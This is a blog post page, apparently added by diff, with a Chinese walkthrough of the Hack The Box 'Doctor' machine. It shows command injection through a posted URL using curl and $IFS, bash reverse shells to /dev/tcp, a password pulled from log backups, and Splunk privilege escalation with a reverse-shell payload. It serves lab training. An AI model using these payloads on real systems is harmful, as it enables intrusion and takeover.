@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="easy难度，用来巩固一下前面学到的东西刚好合适">
+<meta property="og:type" content="article">
+<meta property="og:title" content="doctor-hackthebox">
+<meta property="og:url" content="http://yoursite.com/2021/02/15/doctor-hackthebox/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="easy难度，用来巩固一下前面学到的东西刚好合适">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/11.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/1.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/2.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/3.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/4.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/5.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/6.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/7.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/8.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/9.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/10.png">
+<meta property="article:published_time" content="2021-02-15T14:07:29.000Z">
+<meta property="article:modified_time" content="2021-03-06T13:46:45.802Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="渗透easy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/02/15/doctor-hackthebox/11.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/02/15/doctor-hackthebox/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>doctor-hackthebox | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/15/doctor-hackthebox/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          doctor-hackthebox
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-02-15 22:07:29" itemprop="dateCreated datePublished" datetime="2021-02-15T22:07:29+08:00">2021-02-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-06 21:46:45" itemprop="dateModified" datetime="2021-03-06T21:46:45+08:00">2021-03-06</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>easy难度，用来巩固一下前面学到的东西刚好合适<a id="more"></a></p>
+<img src="/2021/02/15/doctor-hackthebox/11.png" class="">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.209</span><br><span class="line">本机：10.10.14.6</span><br></pre></td></tr></table></figure>
+
+<h3 id="nmap探端口"><a href="#nmap探端口" class="headerlink" title="nmap探端口"></a>nmap探端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/doctor 10.10.10.209</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.91 scan initiated Mon Feb 15 22:18:21 2021 as: nmap -v -sC -sV -oA nmap/doctor 10.10.10.209</span><br><span class="line">Nmap scan report for 10.10.10.209 (10.10.10.209)</span><br><span class="line">Host is up (0.27s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)</span><br><span class="line">|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)</span><br><span class="line">|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089/tcp open  unknown</span><br><span class="line">| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser</span><br><span class="line">| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">| Not valid after:  2023-09-06T15:57:27</span><br></pre></td></tr></table></figure>
+
+<p>已有的信息得知这是一个<code>SplunkServer</code>，访问一下8089端口</p>
+<img src="/2021/02/15/doctor-hackthebox/1.png" class="">
+
+<p>没有什么有用的信息，尝试<code>gobuster</code>爆破一下路径信息</p>
+<h3 id="Gobuster爆破"><a href="#Gobuster爆破" class="headerlink" title="Gobuster爆破"></a>Gobuster爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.209  -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster/doctor</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/15/doctor-hackthebox/2.png" class="">
+
+<p>没有什么隐藏的路径，回来看网页，找到一个邮件地址<code>info@doctors.htb</code>,根据经验，这个<code>doctor.htb</code>应该是可以访问的，在<code>/etc/hosts</code>里加上</p>
+<h3 id="页面信息收集"><a href="#页面信息收集" class="headerlink" title="页面信息收集"></a>页面信息收集</h3><img src="/2021/02/15/doctor-hackthebox/3.png" class="">
+
+<p>是一个登录界面，可以注册，随便注册登录一下，注册之后有提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your account has been created, with a time limit of twenty minutes! </span><br><span class="line">&#x2F;&#x2F;说明cookie被设置了有效时间</span><br></pre></td></tr></table></figure>
+
+<p>登录之后发现可以发公告，一般来说能发公告都是存在XSS的漏洞点，但是测试了没有想到利用方式，反倒想到利用这个发公告，放一个本机链接，看看能不能弹回什么信息</p>
+<img src="/2021/02/15/doctor-hackthebox/4.png" class="">
+
+<p>看到这可以想到这里应该是类似<code>curl $(comment)</code>的形式写的代码</p>
+<p>那应该就可以反弹shell了</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>测试发现可以构造嵌套curl将文件下载到靶机上，本地写一个反弹shell的文件，先下载后监听端口反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#test</span><br><span class="line">bash -c &#39;bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.6&#x2F;9001 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后发布内容，本地python起一个<code>http.server</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载</span></span><br><span class="line">http://10.10.14.6/$(curl$IFS'-o'$IFS'/var/www/html/test'$IFS'http://10.10.14.6/test')</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/15/doctor-hackthebox/5.png" class="">
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反弹shell</span><br><span class="line">http://10.10.14.6/$(bash$IFS'/var/www/html/test')</span><br></pre></td></tr></table></figure>
+
+<p>之后再获取交互式shell</p>
+<img src="/2021/02/15/doctor-hackthebox/6.png" class="">
+
+<p>找到了user.txt，但是只有shaun有权限进行读取</p>
+<img src="/2021/02/15/doctor-hackthebox/7.png" class="">
+
+<h3 id="获取user权限"><a href="#获取user权限" class="headerlink" title="获取user权限"></a>获取user权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user shaun -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>尝试找有关shaun用户的关联文件，没有找到有用的</p>
+<p>在<code>/var/log/apache2</code>路径下发现有备份文件，那么可能存在日志备份了用户的信息，筛选查看</p>
+<img src="/2021/02/15/doctor-hackthebox/8.png" class="">
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat backup | grep pass</span><br><span class="line"><span class="meta">#</span><span class="bash">10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] <span class="string">"POST /reset_password?email=Guitar123"</span> 500 453 <span class="string">"http://doctor.htb/reset_password"</span></span></span><br></pre></td></tr></table></figure>
+
+<p>找到了一条重置密码的记录，可能就是shaun用户重置之后的登录密码，切换用户，成功登录shaun用户</p>
+<p>用户权限到手</p>
+<img src="/2021/02/15/doctor-hackthebox/9.png" class="">
+
+<h3 id="提权ROOT权限"><a href="#提权ROOT权限" class="headerlink" title="提权ROOT权限"></a>提权ROOT权限</h3><p>这部分提权用到最开始发现的<code>SplunkServer</code>服务，github上可以找到对应的提权工具<a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2" target="_blank" rel="noopener">SplunkWhisperer2</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.6 --lport 90 shaun --password Guitar123 --payload "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/9002 0&gt;&amp;1'"</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/15/doctor-hackthebox/10.png" class="">
+
+<p>成功弹回shell，拿到了root权限</p>
+<p>实际上这题easy是因为真正的点在python的SSTI模板注入，这样就能直接利用模板注入获取shell，待填坑</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2021/02/15/doctor-hackthebox/" title="doctor-hackthebox">http://yoursite.com/2021/02/15/doctor-hackthebox/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8Feasy/" rel="tag"># 渗透easy</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/11/SneakMailer-hackthebox/" rel="prev" title="SneakMailer-hackthebox">
+      <i class="fa fa-chevron-left"></i> SneakMailer-hackthebox
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/03/Bitlab-hackthebox/" rel="next" title="Bitlab-hackthebox">
+      Bitlab-hackthebox <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap探端口"><span class="nav-number">1.</span> <span class="nav-text">nmap探端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gobuster爆破"><span class="nav-number">2.</span> <span class="nav-text">Gobuster爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#页面信息收集"><span class="nav-number">3.</span> <span class="nav-text">页面信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">4.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取user权限"><span class="nav-number">5.</span> <span class="nav-text">获取user权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权ROOT权限"><span class="nav-number">6.</span> <span class="nav-text">提权ROOT权限</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">91</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
